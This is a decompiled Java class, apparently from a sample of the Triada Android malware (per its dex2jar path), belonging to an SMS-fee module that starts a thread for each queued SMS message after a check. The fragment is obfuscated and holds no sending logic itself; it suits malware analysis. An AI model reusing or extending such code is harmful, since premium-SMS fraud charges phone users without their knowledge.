package com.android.essdk.eyou.sms;

import android.content.Context;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.e.h;
import java.util.List;

public class a {
  private Context a;
  
  private List b;
  
  private b c;
  
  public a(Context paramContext, List paramList) {
    this.a = paramContext;
    this.b = paramList;
  }
  
  private void b() {
    if (this.c != null)
      this.c.a(); 
  }
  
  public void a() {
    if (h.a(this.a).a()) {
      byte b1 = 0;
      while (true) {
        if (b1 < this.b.size()) {
          b.b("SMSFee", "短信长度smses.size()" + this.b.size());
          (new c(this, this.b.get(b1))).start();
          b1++;
          continue;
        } 
        return;
      } 
    } 
    b();
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/sms/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */